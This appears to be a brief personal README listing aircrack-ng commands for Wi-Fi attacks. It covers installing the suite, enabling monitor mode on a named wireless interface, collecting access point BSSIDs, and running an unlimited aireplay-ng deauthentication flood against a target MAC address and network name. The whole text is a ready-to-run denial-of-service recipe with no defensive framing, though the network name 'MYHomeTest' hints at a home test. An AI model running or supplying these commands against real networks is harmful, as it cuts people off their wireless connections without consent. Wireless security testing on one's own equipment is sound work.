# Installation:

sudo apt install aircrack-ng

## Set WiFi board:
$ sudo airmon-ng

## Create mon0 network:
sudo airmon-ng start wlx24050f4d5af5

## Colect BSSID:
sudo airodump-ng mon0

## Atack
sudo aireplay-ng -0 0 -a MAC_ADDRESS -e MYHomeTest mon0 --ignore-negative-one
 
